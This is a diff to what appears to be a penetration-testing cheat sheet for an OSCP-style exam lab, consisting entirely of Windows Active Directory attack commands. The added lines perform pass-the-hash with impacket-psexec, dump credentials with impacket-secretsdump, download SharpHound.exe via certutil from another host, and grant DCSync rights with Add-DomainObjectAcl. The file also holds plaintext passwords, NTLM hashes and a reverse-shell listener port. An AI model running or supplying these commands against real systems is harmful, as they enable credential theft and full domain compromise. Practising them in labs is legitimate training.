@@ -5,6 +5,10 @@ impacket-psexec oscp.exam/tom_admin@10.10.162.154 -hashes aad3b435b51404eeaad3b4
 ```
 
 ```
+impacket-psexec oscp.exam/administrator@10.10.162.152 -hashes aad3b435b51404eeaad3b435b51404ee:59b280ba707d22e3ef0aa587fc29ffe5
+```
+
+```
 evil-winrm -i 192.168.162.153 -u 'Eric.Wallows' -p 'EricLikesRunning800'
 ```
 
@@ -17,7 +21,11 @@ impacket-mssqlclient 'Administrator:hghgib6vHT3bVWf'@10.10.162.154 -windows-auth
 ```
 
 ```
-ssh administrator@192.168.162.153 
+impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc''oscp.exam'/'tom_admin'@'10.10.162.152'
+```
+
+```
+certutil -urlcache -split -f http://10.10.162.153:4445/SharpHound.exe SharpHound.exe
 ```
 
 ```
@@ -37,6 +45,10 @@ listener_list
 
 ```
 administrator : hghgib6vHT3bVWf
+```
+
+```
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=oscp,DC=exam" -PrincipalIdentity tom_admin -Rights DCSync
 ```
 
 penelope 4444
